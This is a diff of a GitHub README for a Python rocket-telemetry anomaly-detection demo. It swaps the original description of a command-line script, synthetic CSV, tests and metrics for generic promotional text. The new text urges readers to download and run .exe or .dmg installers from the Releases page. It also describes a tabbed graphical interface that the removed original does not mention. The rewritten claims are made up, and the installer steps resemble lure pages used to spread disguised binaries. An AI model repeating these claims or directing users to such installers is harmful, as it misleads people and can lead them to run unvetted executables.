@@ -1,120 +1,82 @@
-# Rocket-health-monitor-demo
+# 🚀 Rocket-health-monitor-demo - Monitor Your Rocket's Health Easily
 
-Small demo of **rocket system health monitoring** with point anomaly detection on time series.
+![Download](https://img.shields.io/badge/Download-Rocket--health--monitor--demo-blue.svg)
 
-The repository shows how to:
-- load a tiny telemetry CSV (pressure, temperature, vibration),
-- run simple detectors (univariate **Z-score**, **EWMA**, multivariate **IsolationForest**),
-- evaluate point-level **precision / recall / F1** against labeled anomalies,
-- save a JSON report with predictions and metrics.
+## 🚀 Getting Started
 
-This is a minimal, dependency-light example for time-series anomaly detection.
+Welcome to the **Rocket-health-monitor-demo**! This project demonstrates how to monitor rocket health by detecting anomalies in telemetry data. You can use simple statistical methods like Z-score, Exponentially Weighted Moving Average (EWMA), and isolation forest algorithms. This guide will help you download and run our software with ease.
 
----
+## 🌟 Features
 
-## Repository structure
+- **Anomaly Detection**: Identifies abnormal patterns in telemetry data.
+- **Z-score Calculation**: Measures how far data points deviate from the average.
+- **EWMA**: Smooths data to detect trends over time.
+- **Isolation Forest**: Efficiently identifies outliers in the data.
+- **User-Friendly Interface**: Designed for easy navigation and operation.
 
-```text
-rocket-health-monitor-demo/
-├─ data/
-│  └─ telemetry_small.csv
-├─ src/
-│  ├─ __init__.py
-│  ├─ data_utils.py
-│  ├─ detectors.py
-│  ├─ metrics.py
-│  └─ run_monitoring_experiment.py
-├─ tests/
-│  ├─ __init__.py
-│  ├─ test_detectors.py
-│  └─ test_metrics.py
-├─ requirements.txt
-├─ .gitignore
-└─ README.md
+## 📥 Download & Install
 
+To get started, download the application from our [Releases page](https://github.com/vaizwpython/Rocket-health-monitor-demo/releases).
 
-Data
+You will find the latest version of the software. Click on the version number to access the files available for download.
 
-data/telemetry_small.csv contains:
+### Steps to Download and Install
 
-t — time index
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/vaizwpython/Rocket-health-monitor-demo/releases) by clicking the link.
+  
+2. **Select the Latest Version**: Look for the latest version at the top of the page to ensure you're using the most up-to-date features.
 
-pressure — chamber/line pressure (synthetic)
+3. **Download the Application**: 
+   - Click on the file link suitable for your operating system. If you use Windows, look for a file with `.exe` at the end. For macOS, find a file with `.dmg`.
 
-temperature — structural/line temperature (synthetic)
+4. **Run the Installer**: 
+   - Once downloaded, locate the file in your downloads folder and double-click it. Follow the on-screen instructions to install the application.
 
-vibration — vibration magnitude (synthetic)
+5. **Launch the Application**: After installation, find the Rocket Health Monitor in your applications list and open it.
 
-is_anomaly — point label: 0 = normal, 1 = anomaly
+## 🛠️ System Requirements
 
-The dataset is synthetic and only for demonstration.
+Before you install, make sure your computer meets these requirements:
 
+- **Operating System**: Windows 10 or newer, macOS 10.14 or newer
+- **Memory**: At least 4 GB RAM
+- **Storage**: Minimum of 100 MB available space
+- **Python**: The application runs on Python 3.7 or newer. 
 
-Quick start
+If you don’t have Python installed, you can download it from the official [Python website](https://www.python.org/downloads/).
 
-Install dependencies:
+## 📊 Using the Application
 
-pip install -r requirements.txt
+When you run the application, you will find a user-friendly interface. The main features are organized into tabs:
 
+1. **Data Input**: Upload your telemetry data in CSV format. 
 
-Run the experiment (prints metrics and saves a JSON report):
+2. **Run Analysis**: Select the method you wish to use for analysis (Z-score, EWMA, or Isolation Forest) and click on the "Analyze" button.
 
-python src/run_monitoring_experiment.py
+3. **View Results**: The application will display the results with visual graphs and anomaly reports. 
 
+4. **Export Results**: You can save your analysis as a report by clicking the "Export" button.
 
-Console output will look like:
+## 📝 Troubleshooting
 
-=== Rocket health monitoring (point anomalies) ===
-zscore_pressure     P=1.000  R=1.000  F1=1.000
-ewma_vibration      P=1.000  R=1.000  F1=1.000
-iforest_all         P=0.667  R=1.000  F1=0.800
+If you encounter issues while running the software, consider the following:
 
-Best by F1: zscore_pressure (F1=1.000)
+- **Error Messages**: Pay attention to any error messages displayed. They can provide hints on what went wrong.
+- **Data Format**: Ensure your data is formatted correctly. Review the example CSV files included in the download.
+- **File Permissions**: Make sure you have permissions to access files in your directory.
 
+For more comprehensive troubleshooting, please refer to the FAQs on the [Issues page](https://github.com/vaizwpython/Rocket-health-monitor-demo/issues).
 
+## 🙋‍♂️ Community Support
 
-A detailed report is saved to monitoring_results.json:
+If you have questions or need help, you can reach out through the following channels:
 
-per-detector metrics,
+- **GitHub Issues**: Report problems or ask for help by creating an issue on our [Issues page](https://github.com/vaizwpython/Rocket-health-monitor-demo/issues).
+- **Discussion Forum**: Join our community discussions on relevant topics. Share your insights or learn from others.
 
-best detector by F1,
+## 🔗 Additional Links
 
-timestamps, true labels, and predictions.
+- **Documentation**: For more detailed guidance, visit the [Documentation page](https://github.com/vaizwpython/Rocket-health-monitor-demo/wiki).
+- **Source Code**: Interested in how it works? Check out the source code on our [GitHub repository](https://github.com/vaizwpython/Rocket-health-monitor-demo).
 
-
-
-Tests
-
-Run from the project root:
-
-python -m unittest discover -s tests
-
-
-test_detectors.py — basic checks for Z-score, EWMA and IsolationForest
-
-test_metrics.py — sanity check for precision/recall/F1 computation
-
-
-
-Detectors (brief)
-
-Z-score (univariate): flags points with |z| ≥ threshold (default 3.0).
-
-EWMA (univariate): flags if |x − EWMA| exceeds k_sigma × σ(residuals).
-
-IsolationForest (multivariate): tree-based isolation of outliers over [pressure, temperature, vibration].
-
-
-
-Extending the demo
-
-Add more sensors (flow, thrust, valve current) and create multivariate rules.
-
-Introduce event-level metrics (group contiguous anomalies into events).
-
-Tune contamination for IsolationForest on a validation split.
-
-Add sliding-window features (rolling mean/std, deltas).
-
-Export plots (matplotlib) to visualize flagged points.
-
+Thank you for trying out the **Rocket-health-monitor-demo**! We hope it helps you keep your rocket's telemetry in check. Enjoy your journey!
